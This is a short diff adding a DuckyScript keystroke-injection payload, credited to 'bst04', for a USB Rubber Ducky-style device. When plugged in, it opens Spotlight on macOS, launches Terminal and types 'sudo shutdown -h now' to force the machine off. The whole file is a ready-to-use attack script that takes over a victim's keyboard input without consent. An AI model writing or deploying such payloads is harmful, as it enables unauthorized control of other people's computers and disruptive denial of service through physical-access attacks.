@@ -1,0 +1,14 @@
+REM ====================================
+REM payload made by bst04
+REM shutdown the macos
+REM ====================================
+DELAY 2000
+GUI SPACE
+DELAY 250
+STRING TERMINAL
+DELAY 250
+ENTER
+DELAY 250
+STRING sudo shutdown -h now
+DELAY 250
+ENTER
